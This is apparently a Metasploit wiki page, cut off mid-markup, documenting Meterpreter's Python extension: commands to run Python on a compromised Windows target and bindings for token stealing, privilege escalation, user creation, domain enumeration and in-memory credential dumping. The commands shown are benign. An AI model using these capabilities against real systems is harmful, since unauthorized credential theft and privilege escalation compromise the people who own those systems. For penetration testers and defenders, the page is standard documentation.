{"componentChunkName":"component---src-templates-wiki-template-tsx","path":"/wiki/Misc/Python-Extension","result":{"data":{"markdownRemark":{"id":"bd2ad6c6-52f9-5da0-baff-548478b1eed5","frontmatter":{"title":"Python Extension","root":null},"html":"<h1 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h1>\n<p>For quite some time, Meterpreter users have wanted the ability to run arbitrary scripts under the context of a session on the target machine. While Railgun gives coders the ability to execute arbitrary Win32 API calls, it doesn't really give them the ability to script the client in a single-shot.</p>\n<p>Meterpreter now has a new extension that aims to solve this problem by providing a completely in-memory Python interpreter that can load scripts, run ad-hoc python commands, and also provides bindings to Meterpreter itself. The extension comes with many (but not <em>all</em>) of the built-in functionality you would expect to see in a running Python interpreter. This includes the likes of <code class=\"language-text\">ctypes</code> for easy automation of Win32-related functions. We've even taken steps to make this extension piggy-back onto <code class=\"language-text\">metsrv</code>'s copy of the SSL libraries in an effort to reduce the size of the resulting binary.</p>\n<p>This page aims to document the features, show examples of how it can be used, and answer a few common questions that come up.</p>\n<p>Unfortunately, at this point in time the extension only works inside x86 and x64 Meterpreters running on Windows targets. However, there are plans to enable this functionality on other implementations over time.</p>\n<h1 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h1>\n<p>As with any other extension that comes with Meterpreter, loading it is very simple:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; use python\nLoading extension python...success.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Once loaded, the help system shows the commands that come with the extension:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; help\n\n    ... snip ...\n\nPython Commands\n===============\n\n    Command         Description\n    -------         -----------\n    python_execute  Execute a python command string\n    python_import   Import/run a python file or module\n    python_reset    Resets/restarts the Python interpreter</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Each of these commands is discussed in detail below.</p>\n<h2 id=\"python_execute\" style=\"position:relative;\"><a href=\"#python_execute\" aria-label=\"python_execute permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>python_execute</h2>\n<p>The <code class=\"language-text\">python_execute</code> command is the simplest of all commands that come with the extension, and provides the means to run single-shot lines of Python code, much in the same way that the normal Python interpreter functions from the command-line when using the <code class=\"language-text\">-c</code> switch. The full help for the command is as follows:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; python_execute -h\nUsage: python_execute &lt;python code&gt; [-r result var name]\n\nRuns the given python string on the target. If a result is required,\nit should be stored in a python variable, and that variable should\npassed using the -r parameter.\n\nOPTIONS:\n\n    -h        Help banner\n    -r &lt;opt&gt;  Name of the variable containing the result (optional)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>A very simple example of this command is shown below:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; python_execute &quot;print &#39;Hi, from Meterpreter!&#39;&quot;\n[+] Content written to stdout:\nHi, from Meterpreter!</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>Notice that any output that is written to stdout is captured by Meterpreter and returned to Metasploit so that it's visible to the user. This also happens for anything written to stderr, as shown below:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; python_execute &quot;x = x + 1&quot;\n[-] Content written to stderr:\nTraceback (most recent call last):\n  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;\nNameError: name &#39;x&#39; is not defined</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>This handy feature now only allows users to see the output of their scripts, but it also means that any errors are completely visible too.</p>\n<p>A more interesting example can be seen below:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; python_execute &quot;x = [y for y in range(0, 20) if y % 5 == 0]&quot;\n[+] Command executed without returning a result</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>The command above executes, but nothing was printed to stdout, or to stderr, and hence nothing was captured.</p>\n<p>The good thing is that the Python extension is persistant across calls. This means that after the above command is executed, <code class=\"language-text\">x</code> is still present in the interpreter and can be accessed with another call:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; python_execute &quot;print x&quot;\n[+] Content written to stdout:\n[0, 5, 10, 15]</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>As useful as this is, developers may want to produce post-modules that make use of the data that a Python script has generated. Parsing stdout is not ideal in such a scenario, and hence this command provides the means for individual variables to be extracted directly using the <code class=\"language-text\">-r</code> paramter, as described by the help:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; python_execute &quot;x = [y for y in range(0, 20) if y % 5 == 0]&quot; -r x\n[+] x = [0, 5, 10, 15]</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Note that this command requires the first parameter to be a string that contains code that needs to be executed. However, this string can be blank, resulting in no code being executed. This means that extraction of content generated in previous calls is still possible without executing more code, or rerunning previous code snippets just to make use of the <code class=\"language-text\">-r</code> parameter:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; python_execute &quot;&quot; -r x\n[+] x = [0, 5, 10, 15]</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Behind the scenes, the result of the execution is a Ruby hash that contains all content written to stdout and stderr, and the content of the variable chosen using the <code class=\"language-text\">-r</code> parameter.</p>\n<p>Sometimes, single-line execution isn't enough, or is cumbersome. The <code class=\"language-text\">python_import</code> command is provided to solve this problem and allow for scripts and modules to be loaded into the target from disk.</p>\n<h2 id=\"python_import\" style=\"position:relative;\"><a href=\"#python_import\" aria-label=\"python_import permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>python_import</h2>\n<p>This command allows for whole modules to be loaded from the attacker's machine an uploaded to the target interpreter. The full help is shown below:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; python_import -h\nUsage: python_import &lt;-f file path&gt; [-n mod name] [-r result var name]\n\nLoads a python code file or module from disk into memory on the target.\nThe module loader requires a path to a folder that contains the module,\nand the folder name will be used as the module name. Only .py files will\nwork with modules.\n\nOPTIONS:\n\n    -f &lt;opt&gt;  Path to the file (.py, .pyc), or module directory to import\n    -h        Help banner\n    -n &lt;opt&gt;  Name of the module (optional, for single files only)\n    -r &lt;opt&gt;  Name of the variable containing the result (optional, single files only)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Importing of module trees is still considered a <em>beta</em> feature, but we encourage you to use it where possible and keep us informed of any issues you may face.</p>\n<p>Consider the following script:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ cat /tmp/drives.py\nimport string\nfrom ctypes import windll\n\ndef get_drives():\n    drives = []\n    bitmask = windll.kernel32.GetLogicalDrives()\n    for letter in string.uppercase:\n        if bitmask &amp; 1:\n            drives.append(letter)\n        bitmask &gt;&gt;= 1\n\n    return drives\n\nresult = get_drives()\nprint result</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>The aim of this is to determine all the local logical drives and put the letters into a list. From there it prints that list to screen. The result of running the script is as follows:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; python_import -f /tmp/drives.py\n[*] Importing /tmp/drives.py ...\n[+] Content written to stdout:\n[&#39;A&#39;, &#39;C&#39;, &#39;D&#39;, &#39;Z&#39;]</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>This shows that <code class=\"language-text\">ctypes</code> does indeed function correctly!</p>\n<p>This command is also intended to allow for recursive loading of modules from the local attacker file system, however this feature is still not yet ready for prime time and work is still actively being done on this area.</p>\n<h2 id=\"python_reset\" style=\"position:relative;\"><a href=\"#python_reset\" aria-label=\"python_reset permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>python_reset</h2>\n<p>It may get to a point where the content of the interpreter needs to be flushed. The <code class=\"language-text\">python_reset</code> command clears out all imports, libraries and global variables:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; python_execute &quot;x = 100&quot;\n[+] Command executed without returning a result\nmeterpreter &gt; python_execute &quot;print x&quot;\n[+] Content written to stdout:\n100\n\nmeterpreter &gt; python_reset\n[+] Python interpreter successfully reset\nmeterpreter &gt; python_execute &quot;print x&quot;\n[-] Content written to stderr:\nTraceback (most recent call last):\n  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;\nNameError: name &#39;x&#39; is not defined</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"meterpreter-bindings\" style=\"position:relative;\"><a href=\"#meterpreter-bindings\" aria-label=\"meterpreter bindings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Meterpreter Bindings</h2>\n<p>A number of bindings are available to the Python extension that allow for interaction with the Meterpreter instance itself. They are broken up into logical modules based on the functionality that they provide. Bindings are available for other extensions as well, and hence in order to use them, those extensions must be loaded. If an extension is not present, and error is thrown. As soon as an extension is loaded, the function should work. Each of the following subsections shows a module namespace that must be imported for that module to function correctly.</p>\n<h3 id=\"binding-list\" style=\"position:relative;\"><a href=\"#binding-list\" aria-label=\"binding list permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Binding list</h3>\n<h4 id=\"meterpreterelevate\" style=\"position:relative;\"><a href=\"#meterpreterelevate\" aria-label=\"meterpreterelevate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>meterpreter.elevate</h4>\n<ul>\n<li><code class=\"language-text\">meterpreter.elevate.getsystem()</code> - maps directly to the <code class=\"language-text\">getsystem</code> command, however only attempts to use technique <code class=\"language-text\">1</code> because this is the only technique that doesn't require a binary to be uploaded.</li>\n<li><code class=\"language-text\">meterpreter.elevate.rev2self()</code> - maps directly to the <code class=\"language-text\">rev2self</code> command.</li>\n<li>\n<p><code class=\"language-text\">meterpreter.elevate.steal_token(pid)</code> - provides the ability to steal a token from another process.</p>\n<ul>\n<li><code class=\"language-text\">pid</code> - the identifier of the process to steal the token from.</li>\n</ul>\n</li>\n<li><code class=\"language-text\">meterpreter.elevate.drop_token()</code> - drops the token that was stolen using <code class=\"language-text\">steal_token</code>.</li>\n</ul>\n<h4 id=\"meterpreterextapi-requires-the-extapi-extension\" style=\"position:relative;\"><a href=\"#meterpreterextapi-requires-the-extapi-extension\" aria-label=\"meterpreterextapi requires the extapi extension permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>meterpreter.extapi (requires the extapi extension)</h4>\n<p>Each of the following functions takes the following parameters:</p>\n<ul>\n<li><code class=\"language-text\">domain_name</code> - the name of the domain that will be enumerated.</li>\n<li><code class=\"language-text\">max_results</code> - maximum number of results (default <code class=\"language-text\">None</code>).</li>\n<li><code class=\"language-text\">page_size</code> - the size of the results page (default <code class=\"language-text\">None</code>).</li>\n</ul>\n<p>The full list of available functions is as follows:</p>\n<ul>\n<li><code class=\"language-text\">meterpreter.extapi.adsi.enum_dcs(domain_name, max_results, page_size)</code> - enumerate the domain controllers on the given domain.</li>\n<li><code class=\"language-text\">meterpreter.extapi.adsi.enum_users(domain_name, max_results, page_size)</code> - enumerate users on the given domain.</li>\n<li>\n<p><code class=\"language-text\">meterpreter.extapi.adsi.enum_group_users_nested(domain_name, group_dn, max_results, page_size)</code> - enumerate users in the given group recursively.</p>\n<ul>\n<li><code class=\"language-text\">group_dn</code> - The distinguished name of the group to enumerate.</li>\n</ul>\n</li>\n<li><code class=\"language-text\">meterpreter.extapi.adsi.enum_computers(domain_name, max_results, page_size)</code> - enumerate computers on the given domain.</li>\n<li>\n<p><code class=\"language-text\">meterpreter.extapi.adsi.domain_query(domain_name, query_filter, fields, max_results, page_size)</code> - provides a generic query mechanism to ADSI. All other functions in this library make use of this function.</p>\n<ul>\n<li><code class=\"language-text\">query_filter</code> - the LDAP-formatted query filter for the query.</li>\n<li><code class=\"language-text\">fields</code> - list of fields to extract from the query results.</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"meterpreterfs\" style=\"position:relative;\"><a href=\"#meterpreterfs\" aria-label=\"meterpreterfs permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>meterpreter.fs</h4>\n<ul>\n<li><code class=\"language-text\">meterpreter.fs.show_mount()</code> - maps to the <code class=\"language-text\">show_mount</code> command and lists all logical drives on the target.</li>\n</ul>\n<h4 id=\"meterpreterincognito-requires-the-incognito-extension\" style=\"position:relative;\"><a href=\"#meterpreterincognito-requires-the-incognito-extension\" aria-label=\"meterpreterincognito requires the incognito extension permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>meterpreter.incognito (requires the incognito extension)</h4>\n<ul>\n<li><code class=\"language-text\">meterpreter.incognito.list_user_tokens()</code> - list all available user tokens.</li>\n<li><code class=\"language-text\">meterpreter.incognito.list_group_tokens()</code> - list all available group tokens.</li>\n<li>\n<p><code class=\"language-text\">meterpreter.incognito.impersonate(user)</code> - impersonate the given user.</p>\n<ul>\n<li><code class=\"language-text\">user</code> - name of the user/group to impersonate in <code class=\"language-text\">DOMAIN\\user</code> format.</li>\n</ul>\n</li>\n<li>\n<p><code class=\"language-text\">meterpreter.incognito.snarf_hashes(server)</code> - run the <code class=\"language-text\">snarf_hashes</code> functionality using the specified server.</p>\n<ul>\n<li><code class=\"language-text\">server</code> - name of the server that is in place and ready to snarf the hashes.</li>\n</ul>\n</li>\n<li>\n<p><code class=\"language-text\">meterpreter.incognito.add_user(server, username, password)</code> - add a user to the given server.</p>\n<ul>\n<li><code class=\"language-text\">server</code> - name of the server to use when adding the user.</li>\n<li><code class=\"language-text\">username</code> - name of the user to create.</li>\n<li><code class=\"language-text\">password</code> - password for the new user.</li>\n</ul>\n</li>\n<li>\n<p><code class=\"language-text\">meterpreter.incognito.add_group_user(server, group, username)</code> - add a user to a group (domain).</p>\n<ul>\n<li><code class=\"language-text\">server</code> - name of the server to use when adding the user to a group.</li>\n<li><code class=\"language-text\">group</code> - name of the group to add the user to.</li>\n<li><code class=\"language-text\">username</code> - name of the user to add to the group.</li>\n</ul>\n</li>\n<li>\n<p><code class=\"language-text\">meterpreter.incognito.add_localgroup_user(server, group, username)</code> - add a user to a group (local).</p>\n<ul>\n<li><code class=\"language-text\">server</code> - name of the server to use when adding the user to a group.</li>\n<li><code class=\"language-text\">group</code> - name of the group to add the user to.</li>\n<li><code class=\"language-text\">username</code> - name of the user to add to the group.</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"meterpreterkiwi-requires-the-kiwi-extension\" style=\"position:relative;\"><a href=\"#meterpreterkiwi-requires-the-kiwi-extension\" aria-label=\"meterpreterkiwi requires the kiwi extension permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>meterpreter.kiwi (requires the kiwi extension)</h4>\n<ul>\n<li><code class=\"language-text\">meterpreter.kiwi.creds_all()</code> - matches the <code class=\"language-text\">creds_all</code> command from the kiwi extension and returns a full list of all credentials that can be pulled from memory.</li>\n</ul>\n<h4 id=\"meterpretersys\" style=\"position:relative;\"><a href=\"#meterpretersys\" aria-label=\"meterpretersys permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>meterpreter.sys</h4>\n<ul>\n<li><code class=\"language-text\">meterpreter.sys.info()</code> - matches the <code class=\"language-text\">sysinfo</code> command and shows system information.</li>\n<li><code class=\"language-text\">meterpreter.sys.ps_list()</code> - matches the <code class=\"language-text\">ps</code> command and lists the processes on the target.</li>\n</ul>\n<h4 id=\"meterpretertransport\" style=\"position:relative;\"><a href=\"#meterpretertransport\" aria-label=\"meterpretertransport permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>meterpreter.transport</h4>\n<ul>\n<li><code class=\"language-text\">meterpreter.transport.list()</code> - list all transports in the target.</li>\n<li><code class=\"language-text\">meterpreter.transport.add(url, session_expiry, comm_timeout, retry_total, retry_wait, ua, proxy_host, proxy_user, proxy_pass, cert_hash)</code> - allows for transports to be added to the Meterpreter session. All but the <code class=\"language-text\">url</code> parameter come with a sane default. Full details of each of these parameters can be found in the <a href=\"https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Transport-Control\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">transport</a> documentation.</li>\n</ul>\n<p>It is not possible to delete transports using the python extension as this opens the door to many kinds of failure.</p>\n<h4 id=\"meterpreteruser\" style=\"position:relative;\"><a href=\"#meterpreteruser\" aria-label=\"meterpreteruser permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 